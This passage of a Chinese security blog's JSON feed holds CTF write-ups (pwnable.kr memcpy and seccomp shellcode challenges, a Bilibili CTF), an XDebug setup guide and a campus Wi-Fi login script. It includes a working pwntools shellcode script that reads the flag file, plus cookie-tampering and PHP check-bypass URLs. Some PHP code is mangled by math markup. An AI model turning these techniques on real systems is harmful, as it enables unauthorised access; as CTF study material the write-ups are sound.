是通过 <code>mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</code>  来得到地址的，这个地址一定是 16 字节对齐的（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDIyNTk0OTUvZG9lcy1tbWFwLXJldHVybi1hbGlnbmVkLXBvaW50ZXItdmFsdWVz\">原因</span>）。而 dest 则是由 malloc 来分配的地址，并且 malloc 返回的地址总是 8 字节对齐，所以就有可能导致地址不是 16 字节对齐。</p>\n<p>但是输入的数据为 128 时，但是程序还是崩溃了</p>\n<p>原因在于堆上分配空间时，除了用户的数据，还有 4 字节的 chunk 信息，再加上 malloc 的 8 字节对齐，所以就无法 16 字节对齐。</p>\n<p>那么接下来输入的数据只需要加上 8 或者 12 就可以满足 16 字节对齐。</p>\n<h2 id=\"memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple\"><a class=\"anchor\" href=\"#memcpyprowl~-nc-0-9022hey-i-have-a-boring-assignment-for-cs-class-the-assignment-is-simple\">#</a> memcpy@prowl:~$ nc 0 9022<br />\nHey, I have a boring assignment for CS class.. 😦<br />\nThe assignment is simple.</h2>\n<ul>\n<li>What is the best implementation of memcpy?        -</li>\n<li>\n<ol>\n<li>implement your own slow/fast version of memcpy -</li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>compare them with various size of data         -</li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li>conclude your experiment and submit report     -</li>\n</ol>\n</li>\n</ul>\n<hr />\n<p>This time, just help me out with my experiment and get flag<br />\nNo fancy hacking, I promise 😄<br />\nspecify the memcpy amount between 8 ~ 16:8<br />\nspecify the memcpy amount between 16 ~ 32:16<br />\nspecify the memcpy amount between 32 ~ 64:32<br />\nspecify the memcpy amount between 64 ~ 128:72<br />\nspecify the memcpy amount between 128 ~ 256:136<br />\nspecify the memcpy amount between 256 ~ 512:264<br />\nspecify the memcpy amount between 512 ~ 1024:520<br />\nspecify the memcpy amount between 1024 ~ 2048:1032<br />\nspecify the memcpy amount between 2048 ~ 4096:2056<br />\nspecify the memcpy amount between 4096 ~ 8192:4104<br />\nok, lets run the experiment with your configuration<br />\nexperiment 1:memcpy with buffer size 8<br />\nellapsed CPU cycles for slow_memcpy:2120<br />\nellapsed CPU cycles for fast_memcpy:170</p>\n<p>experiment 2:memcpy with buffer size 16<br />\nellapsed CPU cycles for slow_memcpy:234<br />\nellapsed CPU cycles for fast_memcpy:208</p>\n<p>experiment 3:memcpy with buffer size 32<br />\nellapsed CPU cycles for slow_memcpy:438<br />\nellapsed CPU cycles for fast_memcpy:340</p>\n<p>experiment 4:memcpy with buffer size 72<br />\nellapsed CPU cycles for slow_memcpy:600<br />\nellapsed CPU cycles for fast_memcpy:212</p>\n<p>experiment 5:memcpy with buffer size 136<br />\nellapsed CPU cycles for slow_memcpy:1208<br />\nellapsed CPU cycles for fast_memcpy:136</p>\n<p>experiment 6:memcpy with buffer size 264<br />\nellapsed CPU cycles for slow_memcpy:1684<br />\nellapsed CPU cycles for fast_memcpy:166</p>\n<p>experiment 7:memcpy with buffer size 520<br />\nellapsed CPU cycles for slow_memcpy:3700<br />\nellapsed CPU cycles for fast_memcpy:232</p>\n<p>experiment 8:memcpy with buffer size 1032<br />\nellapsed CPU cycles for slow_memcpy:7130<br />\nellapsed CPU cycles for fast_memcpy:400</p>\n<p>experiment 9:memcpy with buffer size 2056<br />\nellapsed CPU cycles for slow_memcpy:13596<br />\nellapsed CPU cycles for fast_memcpy:774</p>\n<p>experiment 10:memcpy with buffer size 4104<br />\nellapsed CPU cycles for slow_memcpy:29864<br />\nellapsed CPU cycles for fast_memcpy:1486</p>\n<p>thanks for helping my experiment!<br />\nflag:1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</p>\n<h2 id=\"asm\"><a class=\"anchor\" href=\"#asm\">#</a> asm</h2>\n<h3 id=\"题目描述-18\"><a class=\"anchor\" href=\"#题目描述-18\">#</a> 题目描述</h3>\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;string.h&gt;<br />\n#include &lt;stdlib.h&gt;<br />\n#include &lt;sys/mman.h&gt;<br />\n#include &lt;seccomp.h&gt;<br />\n#include &lt;sys/prctl.h&gt;<br />\n#include &lt;fcntl.h&gt;<br />\n#include &lt;unistd.h&gt;</p>\n<p>#define LENGTH 128</p>\n<p>void sandbox(){<br />\nscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);<br />\nif (ctx == NULL) {<br />\nprintf(&quot;seccomp error\\n&quot;);<br />\nexit(0);<br />\n}</p>\n<pre><code>seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);\nseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);\nseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);\nseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);\nseccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);\n\nif (seccomp_load(ctx) &lt; 0)&#123;\n\tseccomp_release(ctx);\n\tprintf(&quot;seccomp error\\n&quot;);\n\texit(0);\n&#125;\nseccomp_release(ctx);\n</code></pre>\n<p>}</p>\n<p>char stub[] = &quot;\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff&quot;;<br />\nunsigned char filter[256];<br />\nint main(int argc, char* argv[]){</p>\n<pre><code>setvbuf(stdout, 0, _IONBF, 0);\nsetvbuf(stdin, 0, _IOLBF, 0);\n\nprintf(&quot;Welcome to shellcoding practice challenge.\\n&quot;);\nprintf(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\\n&quot;);\nprintf(&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\\n&quot;);\nprintf(&quot;If this does not challenge you. you should play 'asg' challenge :)\\n&quot;);\n\nchar* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);\nmemset(sh, 0x90, 0x1000);\nmemcpy(sh, stub, strlen(stub));\n\nint offset = sizeof(stub);\nprintf(&quot;give me your x64 shellcode: &quot;);\nread(0, sh+offset, 1000);\n\nalarm(10);\nchroot(&quot;/home/asm_pwn&quot;);\t// you are in chroot jail. so you can't use symlink in /tmp\nsandbox();\n((void (*)(void))sh)();\nreturn 0;\n</code></pre>\n<p>}</p>\n<h3 id=\"题目解析-18\"><a class=\"anchor\" href=\"#题目解析-18\">#</a> 题目解析</h3>\n<p>首先程序分配一块内存区域，然后用 0x90 将其填充，接着将 stub 复制进去。</p>\n<p>其中 stub 的内容利用 pwntools 的 asm 模块翻译过来就是清空所有寄存器</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>print disasm(&quot;\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\x31\\xf6\\x48\\x31\\xff\\x48\\x31\\xed\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x4d\\x31\\xd2\\x4d\\x31\\xdb\\x4d\\x31\\xe4\\x4d\\x31\\xed\\x4d\\x31\\xf6\\x4d\\x31\\xff&quot;)<br />\n0:   48                      dec    eax<br />\n1:   31 c0                   xor    eax,eax<br />\n3:   48                      dec    eax<br />\n4:   31 db                   xor    ebx,ebx<br />\n6:   48                      dec    eax<br />\n7:   31 c9                   xor    ecx,ecx<br />\n9:   48                      dec    eax<br />\na:   31 d2                   xor    edx,edx<br />\nc:   48                      dec    eax<br />\nd:   31 f6                   xor    esi,esi<br />\nf:   48                      dec    eax<br />\n10:   31 ff                   xor    edi,edi<br />\n12:   48                      dec    eax<br />\n13:   31 ed                   xor    ebp,ebp<br />\n15:   4d                      dec    ebp<br />\n16:   31 c0                   xor    eax,eax<br />\n18:   4d                      dec    ebp<br />\n19:   31 c9                   xor    ecx,ecx<br />\n1b:   4d                      dec    ebp<br />\n1c:   31 d2                   xor    edx,edx<br />\n1e:   4d                      dec    ebp<br />\n1f:   31 db                   xor    ebx,ebx<br />\n21:   4d                      dec    ebp<br />\n22:   31 e4                   xor    esp,esp<br />\n24:   4d                      dec    ebp<br />\n25:   31 ed                   xor    ebp,ebp<br />\n27:   4d                      dec    ebp<br />\n28:   31 f6                   xor    esi,esi<br />\n2a:   4d                      dec    ebp<br />\n2b:   31 ff                   xor    edi,edi</p>\n</blockquote>\n</blockquote>\n</blockquote>\n<p>接着读取用户输入的数据到内存中。</p>\n<p>重点在这个沙箱函数，通过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2VjY29tcA==\"> seccomp</span> 建立了一些规则，限制了可以使用的系统调用，只能够使用 <code>read</code> 、 <code>open</code> 、 <code>write</code> 、 <code>exit</code> 、 <code>exit_group</code> 。</p>\n<p>但有这几个函数就足以构造出 shellcode 去读取 flag，利用 pwntools 的 shellcraft 模块和 asm 模块很轻松就可以完成。</p>\n<p>汇编语言函数返回值一般是在 eax (rax) 中，所以 open 之后 read 的 fd 参数填 rax</p>\n<p>from pwn import *</p>\n<p>r=ssh('asm','<span class=\"exturl\" data-url=\"aHR0cDovL3B3bmFibGUua3I=\">pwnable.kr</span>',2222,'guest')<br />\np=r.connect_remote('localhost',9026)<br />\ncontext(arch='amd64', os='linux')</p>\n<p>payload=&quot;&quot;<br />\npayload=shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')<br />\npayload+=shellcraft.open('rsp',0,0)<br />\npayload+=shellcraft.read('rax','rsp',100)<br />\npayload+=shellcraft.write(1,'rsp',100)</p>\n<p>print p.recvuntil('shellcode: ')</p>\n<p>p.sendline(asm(payload))</p>\n<p>print p.recvline()</p>\n<p>后来测试了下，也可以直接 open 打开</p>\n<p>payload+=shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')</p>\n",
            "tags": [
                "CTF",
                "CTF",
                "PWN"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/VScode+XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95ThinkPHP%20RCE/",
            "url": "https://a1oyss.github.io/%E6%9D%82%E8%AE%B0/VScode+XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95ThinkPHP%20RCE/",
            "title": "VScode+XDebug远程调试ThinkPHP RCE",
            "date_published": "2020-12-02T00:29:14.000Z",
            "content_html": "<p>#CTF #PHP #VSCode</p>\n<h1 id=\"环境准备\"><a class=\"anchor\" href=\"#环境准备\">#</a> 环境准备</h1>\n<ul>\n<li>VScode</li>\n<li>VMware</li>\n</ul>\n<h1 id=\"宿主机配置\"><a class=\"anchor\" href=\"#宿主机配置\">#</a> 宿主机配置</h1>\n<ol>\n<li>将 ThinkPHP 5.0.5（或者其他源码）下载到宿主机当中，使用 VScode 打开项目</li>\n<li>安装 PHP Debug</li>\n<li>点击左侧栏中的运行，选择创建 launch.json 文件，写入配置</li>\n</ol>\n<p>{<br />\n&quot;name&quot;: &quot;Listen for XDebug&quot;,<br />\n&quot;type&quot;: &quot;php&quot;,<br />\n&quot;request&quot;: &quot;launch&quot;,<br />\n&quot;pathMappings&quot;: {<br />\n&quot;虚拟机当中的源码位置&quot;: &quot;${workspaceRoot}&quot;<br />\n},<br />\n&quot;port&quot;: 9000 // 默认 XDebug 端口<br />\n}</p>\n<h1 id=\"虚拟机配置\"><a class=\"anchor\" href=\"#虚拟机配置\">#</a> 虚拟机配置</h1>\n<ol>\n<li>首先安装 XDebug，<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ZGVidWcub3JnL2RvY3MvaW5zdGFsbA==\">官网</span>有非常详细的安装教程。</li>\n<li>修改 XDebug.ini 配置，这里建议去写一个 phpinfo () 文件，在这里面查看</li>\n</ol>\n<p>Additional .ini files parsed</p>\n<p>/etc/php/7.4/apache2/conf.d/20-xdebug.ini</p>\n<p>编辑此配置文件，一般第一行 <code>zend_extension</code>  是已经写好的，如果没有的话加上 xdebug 的路径就行</p>\n<p>接着在下面写入其他配置</p>\n<p>[XDebug]<br />\nxdebug.remote_enable = 1<br />\nxdebug.remote_autostart = 1<br />\nxdebug.remote_port = 9000 // 端口可以自定义，与 vscode 的保持一致就行<br />\n xdebug.remote_connect_back = 1<br />\nxdebug.auto_trace = 1<br />\nxdebug.collect_includes = 1<br />\nxdebug.collect_params = 1<br />\n; xdebug.remote_log = /var/log/xdebug.log// 可选</p>\n<p>关于配置以及 xdebug 原理之后会详细说。</p>\n<ol start=\"3\">\n<li>重启服务，我的是 apache，使用 <code>service apache2 restart</code>  重启服务。</li>\n</ol>\n<h1 id=\"开始调试\"><a class=\"anchor\" href=\"#开始调试\">#</a> 开始调试</h1>\n<p>VScode 中，在需要调试的地方下好断点，然后在点击运行中的开始调试</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1606658034288-172a33e3-3c50-4f7b-a9f6-e53fa05e6fbf.png\" alt=\"\" /></p>\n<p>vscode 就会开始监听 9000 端口，等待 xdebug 的连接，然后去访问会触发断点的网页即可。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1606658143202-4c2ad032-9691-4188-9ccb-0f5908b2034d.png\" alt=\"\" />可以看到成功触发断点。</p>\n<h1 id=\"xdebug原理\"><a class=\"anchor\" href=\"#xdebug原理\">#</a> XDebug 原理</h1>\n<p>首先 XDebug 需要客户端以及服务端。</p>\n<p>服务端就是我们在 VMware 中安装的 XDebug，而客户端一般来说像 PHPStorm 这样的 IDE 自带，或者 VScode 自己去安装 PHP Debug。</p>\n<p>当进行 XDebug 调试时，首先客户端会开始监听端口，等待 XDebug 的连接，连接成功则开始调试。如图所示：</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/gif/2658344/1606658438431-fb756647-266f-43e9-b346-9ada6c464e83.gif\" alt=\"\" /></p>\n<p>图片来自<span class=\"exturl\" data-url=\"aHR0cDovL2d1b2ppYW54aWFuZy5jb20vcG9zdHMvMjAxNS0wOS0wNi1QSFBfRGVidWdfVG9vbC1YZGVidWcuaHRtbA==\"> http://guojianxiang.com/posts/2015-09-06-PHP_Debug_Tool-Xdebug.html</span></p>\n<p>这里面是将 <code>xdebug.remote_host</code>  设为一个固定值，也就是说只会朝 <code>remote_host</code>  指向的 IP 发送调试请求。</p>\n<p>但是如果将 <code>xdebug.remote_connect_back</code>  的值设为 1，即可取消此限制。</p>\n<p>设置这个值之后，xdebug 会从 http 请求的头部获取客户端的 ip 当作 remote_host，而原本的 remote_host 即使设置了，也会忽略。</p>\n",
            "tags": [
                "杂记",
                "CTF",
                "IDE",
                "PHP"
            ]
        },
        {
            "id": "https://a1oyss.github.io/CTF/%E9%A6%96%E5%B1%8ABilibili%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/",
            "url": "https://a1oyss.github.io/CTF/%E9%A6%96%E5%B1%8ABilibili%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/",
            "title": "首届Bilibili安全挑战赛",
            "date_published": "2020-11-16T10:43:10.000Z",
            "content_html": "<p>#CTF<br />\n 这波啊，这波是全国上下共享一个靶机</p>\n<h1 id=\"页面的背后是什么\"><a class=\"anchor\" href=\"#页面的背后是什么\">#</a> 页面的背后是什么？</h1>\n<h4 id=\"题目地址-http4511320136indexhtml\"><a class=\"anchor\" href=\"#题目地址-http4511320136indexhtml\">#</a> 题目地址： <span class=\"exturl\" data-url=\"aHR0cDovLzQ1LjExMy4yMDEuMzYvaW5kZXguaHRtbA==\">http://45.113.201.36/index.html</span></h4>\n<p>是叔叔我啊！<br />\n<span id=\"more\"></span><br />\n 直接查看源码，看到</p>\n<p>$.ajax({<br />\nurl: &quot;api/admin&quot;,<br />\ntype: &quot;get&quot;,<br />\nsuccess:function (data) {<br />\n<a href=\"//console.log\">//console.log</a>(data);<br />\nif (data.code == 200){<br />\n// 如果有值：前端跳转<br />\n var input = document.getElementById (&quot;flag1&quot;);<br />\ninput.value = String(data.data);<br />\n} else {<br />\n// 如果没值<br />\n $('#flag1').html (&quot;接口异常，请稍后再试～&quot;);<br />\n}<br />\n}<br />\n})</p>\n<p>请求 api/admin，得到 flag</p>\n<h1 id=\"真正的秘密只有特殊的设备才能看到\"><a class=\"anchor\" href=\"#真正的秘密只有特殊的设备才能看到\">#</a> 真正的秘密只有特殊的设备才能看到</h1>\n<p>$.ajax({<br />\nurl: &quot;api/ctf/2&quot;,<br />\ntype: &quot;get&quot;,<br />\nsuccess:function (data) {<br />\n<a href=\"//console.log\">//console.log</a>(data);<br />\nif (data.code == 200){<br />\n// 如果有值：前端跳转<br />\n $('#flag2').html (&quot;flag2:&quot; + data.data);<br />\n} else {<br />\n// 如果没值<br />\n $('#flag2').html (&quot;需要使用 bilibili Security Browser 浏览器访问～&quot;);<br />\n}<br />\n}<br />\n})</p>\n<p>根据提示，伪造 UserAgent:  <code>bilibili Security Browser</code></p>\n<h1 id=\"密码是啥\"><a class=\"anchor\" href=\"#密码是啥\">#</a> 密码是啥？</h1>\n<p>是陈睿叔叔的生日</p>\n<p>很简单，弱口令</p>\n<p>用户名 admin，密码 bilibili</p>\n<h1 id=\"对不起权限不足~\"><a class=\"anchor\" href=\"#对不起权限不足~\">#</a> 对不起，权限不足～</h1>\n<p>依旧靠猜，提示超级管理员才能看到，抓包，发现 cookie 里面有个 role</p>\n<p>Cookie: role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=eyJ1aWQiOiI4NjY0MzIxIn0.X5QmyQ.nJVuwtiLPHwl0tdBr-QoXYew0jE</p>\n<p>把 role 拿去 md5 解密，得到 user，接下来就是猜管理员的名字了。</p>\n<p>superadmin，admin，su，root，superuser 全都不对，最后看到别人的提示，Windows 超级管理员，这才知道是 Administrator。傻不傻啊</p>\n<h1 id=\"结束亦是开始\"><a class=\"anchor\" href=\"#结束亦是开始\">#</a> 结束亦是开始</h1>\n<p>根据提示，把 single 改为 end，得到 你想要的不在这儿～，然后，就没有然后了</p>\n<p>根据群里大佬的思路，扫目录，发现 test.php 下有东西，一堆 jsfuck 代码</p>\n<p>放进浏览器执行，得到：</p>\n<p>var str1 = &quot;\\u7a0b\\u5e8f\\u5458\\u6700\\u591a\\u7684\\u5730\\u65b9&quot;;<br />\nvar str2 = &quot;bilibili1024havefun&quot;;<br />\nconsole.log()</p>\n<p>解码 str1， <code>&quot;程序员最多的地方&quot;</code> ，那就是 github 了。</p>\n<p>进 GitHub 搜索第二个字符串 <code>bilibili1024havefun</code> ，找到一个 end.php 的源码</p>\n<p>&lt;?php</p>\n<p>//filename end.php</p>\n<p>$bilibili = &quot;bilibili1024havefun&quot;;</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mo>=</mo><mi>i</mi><mi>n</mi><mi>t</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">str = intval(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mopen\">(</span></span></span></span>_GET['id']);<br />\n$reg = preg_match('/\\d/is', $_GET['id']);</p>\n<p>if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){<br />\n<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo>=</mo><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>g</mi></msub><mi>e</mi><msub><mi>t</mi><mi>c</mi></msub><mi>o</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>s</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">content = file_get_contents(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15139200000000003em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">g</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">t</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">(</span></span></span></span>_GET['url']);</p>\n<pre><code>//文件路径猜解\nif (false)&#123;\n\techo &quot;还差一点点啦～&quot;;\n&#125;else&#123;\n\techo $flag;\n&#125;\n</code></pre>\n<p>}else{<br />\necho &quot;你想要的不在这儿～&quot;;<br />\n}<br />\n?&gt;</p>\n<p>好家伙，真就硬猜呗</p>\n<p>根据源码绕过 + 猜路径，构造 url</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyMC45Mi4xNTEuMTg5L2Jsb2cvZW5kLnBocD9pZCU1QiU1RD0xJmFtcDt1cmw9L2FwaS9jdGYvNi9mbGFnLnR4dA==\">http://120.92.151.189/blog/end.php?id[]=1&amp;url=/api/ctf/6/flag.txt</span></p>\n<p>然而得到的却是第十题的答案</p>\n<p>七八九十待续。。。</p>\n",
            "tags": [
                "CTF",
                "CTF"
            ]
        },
        {
            "id": "https://a1oyss.github.io/Python/Python%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95/",
            "url": "https://a1oyss.github.io/Python/Python%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%99%BB%E5%BD%95/",
            "title": "Python校园网登录",
            "date_published": "2020-10-09T13:48:46.000Z",
            "content_html": "<p>#Python #爬虫</p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>做个开机自动登录 WiFi 脚本</p>\n<h1 id=\"配置环境\"><a class=\"anchor\" href=\"#配置环境\">#</a> 配置环境</h1>\n<ul>\n<li>Python 3.7</li>\n<li>Pycharm</li>\n<li>Fiddler Everywhere</li>\n</ul>\n<p><span id=\"more\"></span></p>\n<h1 id=\"抓包分析\"><a class=\"anchor\" href=\"#抓包分析\">#</a> 抓包分析</h1>\n<p><strong>登陆界面</strong></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602160396411-a02cc83c-51c5-454c-b675-326a3a0b24bf.png\" alt=\"\" /></p>\n<p><strong>请求地址</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzIxMS42OS4xNS4zMzo5OTk5L3BvcnRhbEF1dGhBY3Rpb24uZG8=\">http://211.69.15.33:9999/portalAuthAction.do</span></p>\n<p><strong>请求数据</strong></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602160396415-a3c20c20-e56b-4e5b-ad92-d14bbbe31acc.png\" alt=\"\" /></p>\n<p>其中关键的只有 wlanuserip，wlanacIp，userid，useridtemp，passwd。</p>\n<p>wlanuserip，wlanacIp 可以通过 ipconfig 获取，也可以访问校园网界面，获取参数，这里选择后者。</p>\n<h1 id=\"python代码\"><a class=\"anchor\" href=\"#python代码\">#</a> Python 代码</h1>\n<p>import requests<br />\nfrom bs4 import BeautifulSoup<br />\nfrom win10toast import ToastNotifier<br />\nimport webbrowser</p>\n<p>class HAITWIFI:</p>\n<pre><code>def __init__(self):\n    self.username = '用户名'\n    self.password = '密码'\n    # 移动@gxyyd  联通@gxylt  电信@gxydx\n    self.operator = &#123;'1': '@gxyyd', '2': '@gxylt', '3': '@gxydx'&#125;.get('1', '@gxyyd')\n\ndef getIP(self):\n    # 获取动态参数\n    url = '校园网url'\n    r = requests.get(url)\n    soup = BeautifulSoup(r.content, 'html5lib')\n    wlanuserip = soup.find('input', attrs=&#123;'name': 'wlanuserip'&#125;).attrs['value']\n    wlanacip = soup.find('input', attrs=&#123;'name': 'wlanacIp'&#125;).attrs['value']\n    return wlanuserip, wlanacip\n\ndef login(self):\n    # 登录模块\n    ip = self.getIP()\n    login_url = &quot;登录url&quot;\n    headers = &#123;\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                      'Chrome/85.0.4183.121 Safari/537.36',\n        'Referer': '校园网url',\n    &#125;\n    post_data = &#123;'wlanuserip': ip[0],\n                 'wlanacname': 'HAIT-SR8808',\n                 'chal_id': '',\n                 'chal_vector': '',\n                 'auth_type': 'PAP',\n                 'seq_id': '',\n                 'req_id': '',\n                 'wlanacIp': ip[1],\n                 'ssid': '',\n                 'vlan': '',\n                 'mac': '',\n                 'message': '',\n                 'bank_acct': '',\n                 'isCookies': '',\n                 'version': '0',\n                 'authkey': '88----89',\n                 'url': '',\n                 'usertime': '0',\n                 'listpasscode': '0',\n                 'listgetpass': '0',\n                 'getpasstype': '0',\n                 'randstr': '7150',\n                 'domain': '',\n                 'isRadiusProxy': 'true',\n                 'usertype': '0',\n                 'isHaveNotice': '0',\n                 'times': 12,\n                 'weizhi': 0,\n                 'smsid': '',\n                 'freeuser': '',\n                 'freepasswd': '',\n                 'listwxauth': '0',\n                 'templatetype': '1',\n                 'tname': 'gxy_pc_portal',\n                 'logintype': '0',\n                 'act': '',\n                 'is189': 'false',\n                 'terminalType': '',\n                 'checkterminal': 'true',\n                 'portalpageid': '23',\n                 'listfreeauth': '0',\n                 'viewlogin': '1',\n                 'userid': self.username + self.operator,\n                 'authGroupId': '',\n                 'smsoperatorsflat': '',\n                 'useridtemp': self.username + self.operator,\n                 'passwd': self.password,\n                 'operator': self.operator&#125;\n    r = requests.post(url=login_url, data=post_data, headers=headers)\n    bs = BeautifulSoup(r.content, 'html5lib')\n    toaster = ToastNotifier()\n    if bs.find_all('input', id='loginOut') != []:\n        toaster.show_toast('WIFI登录', '登录成功', icon_path='D:\\\\Program Files\\\\Python37\\\\DLLs\\\\py.ico', duration=2, threaded=True)\n    else:\n        toaster.show_toast('WIFI登录', '登录失败', icon_path='D:\\\\Program Files\\\\Python37\\\\DLLs\\\\py.ico', duration=2, threaded=True)\n        webbrowser.open(\n            'http://url/portalReceiveAction.do?wlanuserip=' + ip[0] + '&amp;wlanacname=HAIT-SR8808')\n</code></pre>\n<p>HAITlogin = HAITWIFI()<br />\nHAITlogin.login()</p>\n<h1 